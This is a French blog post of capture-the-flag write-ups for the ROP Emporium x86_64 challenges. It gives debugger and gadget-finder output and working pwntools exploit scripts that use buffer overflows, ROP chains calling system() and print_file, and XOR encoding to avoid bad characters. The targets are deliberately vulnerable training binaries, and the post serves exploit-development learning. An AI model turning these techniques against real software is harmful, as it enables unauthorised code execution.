---
title: "ROP Emporium Writeups"
layout: "post"
categories: "Linux"
tags: ["Binary Exploitation", "ROPEmporium", "Writeup", "Exploit Development"]
---

Aujourd'hui je vous propose mes writeups des challenges x86_64 de [ROP Emporium](https://ropemporium.com/). Vous pouvez retrouver les [scripts de solution](https://github.com/nuts7/nuts7.github.io/tree/master/articles/ropemporium-writeups) directement sur mon GitHub. 😀

# ret2win

Tout d'abord, le premier challenge nommé ret2win est une introduction au pwn, c'est un buffer overflow classique avec une redirection de flux de la save RIP vers une fonction présente en analogue dans le binaire qui affiche le flag.

La seul protection active sur le binaire est le bit NX :

```bash
❯ readelf -l ret2win # Affiche les informations contenues dans les headers des segments du fichier.

Type de fichier ELF est EXEC (fichier exécutable)
Point d'entrée 0x4005b0
Il y a 9 en-têtes de programme, débutant à l'adresse de décalage 64

En-têtes de programme :
<...>
GNU_STACK       0x0000000000000000 0x0000000000000000 0x0000000000000000
                0x0000000000000000 0x0000000000000000  RW     0x10
<...>
```

Nous voyons ici que la stack n'est pas exécutable, cependant nous n'allons pas exécuter de shellcode dans la stack donc cela n'influencera pas notre exploitation.

Premièrement, nous devons trouver l'offset afin d'overwrite l'adresse de la sauvegarde RIP pour cela nous allons run le programme avec un pattern et check à combien d'octets de notre padding le programme crash !

```bash
gef➤  pattern c 50 # Création de notre pattern de 50 octets
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
gef➤  run # Démarrer le programme
Starting program: /home/nuts/Documents/CTF/ropemporium/ret2win/ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga # Envoie du pattern
<...>
gef➤  pattern s $rbp # Recherche de la chaine contenue dans RBP, RBP étant avant RIP
[+] Searching '$rbp'
[+] Found at offset 32 (little-endian search) likely
[+] Found at offset 25 (big-endian search)
```
Notre offset à parcourir afin d'arriver à la sRIP est de 40 bytes.

Il nous suffit maintenant d'envoyer 40 fois la lettre A et de concaténer une adresse valide, ici l'adresse de la fonction ret2win afin de jump sur cette dernière à la fin du sys_read.

Pour cela, nous devons récupérer l'adresse de ret2win :

```bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
<...>
0x0000000000400756  ret2win
<...>
```

Nous allons donc build ce payload :

![ak](https://i.imgur.com/6QUiFZA.png)

Nous n'allons pas développer un script Python avec la librairie pwntools mais simplement un one-liner en Python :

Sans pwntools :
```bash
python2 -c "print 'A' * 40 + '\x56\x07\x40\x00\x00\x00\x00\x00' " | ./ret2win
```
Avec pwntools :
```bash
python2 -c "import pwn; print 'A' * 40 + pwn.p64(0x400756)" | ./ret2win
```

La fonction `p64()` de pwntools pack une adresse 64 bits en little endian.

# split

Pour ce deuxième challenge, nous allons commencer à apprendre le ROP avec une exploitation d'un binaire avec une première petite ROPchain !

Le but de ce challenge est d'utiliser un gadget `pop rdi ; ret` afin de passer l'argument `/bin/cat flag.txt` (présent dans le binaire) à la fonction `system()`.
Je ne vais pas rappeler les bases du ROP, je vous redirige vers [mon article sur le ROP via un leak libc](https://nuts7.github.io/return-oriented-programming/)

Récupérons les adresses de nos différents prérequis :

```bash
❯ ropper --file split --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret;

❯ rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
<...>
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt

❯ objdump -D split -M intel | grep system@plt
0000000000400560 <system@plt>
```

Voici le schéma de notre exploitation :

![](https://i.imgur.com/xGExZwp.png)

Pour une ROPchain simple comme celle ci nous allons faire un one-liner en Python :

```bash
python2 -c "from pwn import *; print 'A' * 40 + p64(0x4007c3) + p64(0x601060) + p64(0x400566)" | ./split # pop rdi ; ret + /bin/cat flag.txt + system
```

# callme

Il est indiqué dans la description de ce challenge que nous devons appeler la fonction `callme_one()`, `callme_two()` et `callme_three()` prennant chacunes les arguments suivants : `0xdeadbeefdeadbeef`, `0xcafebabecafebabe` et `0xd00df00dd00df00d`.

Nous avons un gadget interéssant :

```bash
❯ ROPgadget --binary=callme | grep "pop rdi ; pop rsi ; pop rdx"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

Le gadget `pop rdi ; pop rsi ; pop rdx ; ret` setup 3 arguments à une fonction. Ce qui est idéal pour notre exploitation !

![](https://i.imgur.com/hQbtJdU.png)

Pour ce challenge, il est plus judicieux de développer un petit script Python :

```py
from pwn import *

context.update(arch="amd64", os="linux", bits=64)
p = process("./callme")
elf = ELF("./callme")
rop = ROP("./callme")

pld = cyclic(40)
gadget = (rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0]
argv_1 = p64(0xdeadbeefdeadbeef)
argv_2 = p64(0xcafebabecafebabe)
argv_3 = p64(0xd00df00dd00df00d)
functions_to_call = ['callme_one', 'callme_two', 'callme_three']

for function in functions_to_call:
    pld += p64(gadget)
    pld += argv_1
    pld += argv_2
    pld += argv_3
    pld += p64(elf.symbols[function])

p.sendline(pld)
p.interactive()
```

# write4

- Après lecture de la description du [challenge write4](https://ropemporium.com/challenge/write4.html), nous comprenons que nous allons devoir **write flag.txt** en mémoire dans un **segment du binaire accessible en écriture** car cette string n'est pas présente de facon analogue et **call** la fonction `print_file()` dans la **PLT**. Il est spécifié que `print_file()` prend comme seul argument **l'emplacement mémoire** de flag.txt.

C'est un binaire 64 bits linké dynamiquement et non strippé ayant le bit NX d'activé ainsi que l'ASLR :

```bash
❯ checksec --file=write4
[*] '/home/nuts/Documents/CTF/ropemporium/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  '.'
❯ file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
❯ cat /proc/sys/kernel/randomize_va_space
2
```

Premièrement regardons les permissions des différents segments et sections du binaire :

```py
❯ readelf -S write4
Il y a 29 en-têtes de section, débutant à l'adresse de décalage 0x1980:

En-têtes de section :
<...>
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
<..>
Clé des fanions :
  W (écriture), A (allocation), X (exécution), M (fusion), S (chaînes), I (info),
  L (ordre des liens), O (traitement supplémentaire par l'OS requis), G (groupe),
  T (TLS), C (compressé), x (inconnu), o (spécifique à l'OS), E (exclu),
  l (grand), p (processor specific)
❯ rabin2 -S write4
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
<...>
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
<...>
```

Nous remarquons que nous avons 2 segments avec le **flag W** (écriture) d'activé. Par exemple, écrivons la string **flag.txt** dans le segment `.data`. (nous pouvons aussi utiliser .bss)

Récupérons l'adresse du segment :

```py
❯ readelf -s write4 | grep .data
     5: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    48: 0000000000601028     0 NOTYPE  WEAK   DEFAULT   23 data_start
    49: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 0000000000601028     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
```

L'adresse de ce dernier est `0x601028`.

Maintenant, nous devons trouver un moyen de setup flag.txt dans .data. Pour cela nous avons 2 gadgets intéressants `pop r14 ; pop 15 ; ret` et `mov qword ptr [r14], r15 ; ret` :

```py
❯ ROPgadget --binary write4
<...>
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
<...>
```

- Le but va etre d'empiler **l'adresse du segment writable** (.data) et la string **flag.txt** grace au buffer overflow, de setup ses valeurs dans 2 registres (ici r14 et r15) à l'aide d'un pop, puis de copier la valeur pointé dans l'opérande source (r15 qui pointe vers flag.txt) dans l'opérande de destination. (r14 qui pointe vers l'adresse de .data)
Ainsi, notre string flag.txt sera stocké à l'adresse du segment .data.

Rappel : pop permet de désempiler de la stack la valeur pointé dans RSP et déplacer cette valeur dans l'opérande indiquée.

Une fois que nous avons flag.txt dans notre binaire, il nous suffit simplement de passer en argument cette chaine à la fonction `print_file()`. Alors nous avons besoin d'un gadget `pop rdi ; ret` et évidemment de l'adresse de la fonction `print_file()` :

```py
❯ ROPgadget --binary write4 | grep "pop rdi ; ret"
0x0000000000400693 : pop rdi ; ret
❯ objdump -d write4 | grep print_file
0000000000400510 <print_file@plt>:
  400510:       ff 25 0a 0b 20 00       jmpq   *0x200b0a(%rip)        # 601020 <print_file>
  400620:       e8 eb fe ff ff          callq  400510 <print_file@plt>
```

Voici le schéma de notre payload :

![](https://i.imgur.com/iWC7qYj.png)

Afin d'automatiser notre exploitation j'ai développé un petit script en Python toujours avec la [librairie pwntools](https://github.com/Gallopsled/pwntools) :

```py
from pwn import *

context.update(arch="amd64", os="linux", bits=64)
p = process("./write4", stdin=PTY)
elf = ELF("./write4")
rop = ROP("./write4")

padding = cyclic(40)

data_segment = p64(elf.symbols["data_start"]) # readelf -s write4
flag_string = b"flag.txt"

pop_r14_pop_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
mov_ptr_r14_r15 = p64(0x400628)

pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
print_file = p64(elf.symbols['print_file'])

pld = padding
pld += pop_r14_pop_r15 # to setup data addr & flag.txt in registers
pld += data_segment
pld += flag_string
pld += mov_ptr_r14_r15 # mov qword ptr [r14], r15 ; ret ==> to move flag.txt in data segment
pld += pop_rdi # to put the memory location of flag.txt in print_file() as argument
pld += data_segment
pld += print_file

p.sendline(pld)
p.interactive()
```

# badchars

- La description nous indique que le challenge est similaire au challenge write4. Cependant, le binaire nous impose quelques restrictions telles que la présence de bad chars.

## Qu'est ce qu'un bad char ?

Les bad chars sont une **liste de caractère** non désirés qui peuvent potentiellement **casser l'interprétation** d'un **shellcode**.

Exemples de bad chars:
1. 00 -> NULL
2. 0A -> Line break -> \n
3. 0D -> Carriage return -> \r
4. FF -> Form feed -> \f

Lors de l'exécution de notre programme, le binaire nous indique les bad chars :

```py
❯ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
>
```

Nous pouvons donc en conclure que lors de l'exploitation, nous ne pourrons pas utiliser les caractères ci dessus.

La méthodologie d'exploitation de notre binaire reste tout de meme similaire :
- Trouver l'adresse d'un segment accessible en écriture
- Obtenir les gadgets nécéssaires pour écrire la string flag.txt dans le segment en question
- Utilisez la fonction `print_file()` et un gadget `pop rdi ; ret` afin de print le flag

Cependant, vous avez du le remarquer, flag.txt possède des bad chars !
Si vous avez lu la description du challenge, vous pouvez y voir un indice interéssant : "XOR"

Nous pouvons alors xorer la string flag.txt mais elle ne sera pas valide. Alors comment la unxorer ?

Commençons l'exploitation...

- Trouver un segment accessible en écriture ainsi que son adresse :

```py
❯ rabin2 -S badchars
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
<...>
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
<...>
```
- Trouver des gadgets permettant de setup flag.txt et l'adresse du segment data ou bss dans des registres et de move le flag.txt dans le segment:

```py
❯ ROPgadget --binary badchars
Gadgets information
============================================================
<...>
0x0000000000400634 : mov qword ptr [r13], r12 ; ret
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
<...>
```

Nous pouvons faire pointer les registres r12 pour le flag.txt, r13 pour l'adresse du segment data et compléter r14 et r15 avec des null bytes grâce aux `pop <opérande>`.


```py
#!/usr/bin/python2
from pwn import *

context.update(arch="amd64", os="linux", bits=64)
p = process("./badchars", stdin=PTY)
elf = context.binary = ELF("./badchars")
rop = ROP("./badchars")

data_segment = elf.symbols["data_start"]+7 # add 7 bytes to LSB because when you start at the start address the 6th byte is badchar (0x60102e ==> 2e = .)
pop_r14_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
payload = None


def xor_flag(flag):
    flag_list = list(flag)
    for i in range(0, len(flag_list)):
        flag_list[i] = chr(ord(flag_list[i])^0x02)
    return "".join(flag_list)


def write_xored_flag_string_in_segment():
    global data_segment, payload
    padding = "\x90"*40

    xored_flag = xor_flag("flag.txt")
    pop_r12_r13_r14_r15 = p64((rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"]))[0])
    mov_r13_r12 = p64(0x400634)

    payload = padding
    payload += pop_r12_r13_r14_r15
    payload += xored_flag
    payload += p64(data_segment)
    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r14 with null bytes
    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r15 with null bytes
    payload += mov_r13_r12 # to put xored flag in data segment


def unxor_flag_string_in_segment():
    global data_segment, pop_r14_r15, payload
    xor_byte_ptr_r15_r14 = p64(0x400628)

    # to unXOR each chars
    for i in range(8):
        payload += pop_r14_r15 # to setup XOR key in r14 & data_segment in r15
        payload += p64(0x2) # XOR key
        payload += p64(data_segment + i)
        payload += xor_byte_ptr_r15_r14


def print_flag_via_print_file():
    global data_segment, payload
    pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
    print_file_subroutine = p64(elf.symbols["print_file"])

    payload += pop_rdi
    payload += p64(data_segment)
    payload += print_file_subroutine

write_xored_flag_string_in_segment(), unxor_flag_string_in_segment(), print_flag_via_print_file()

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
```
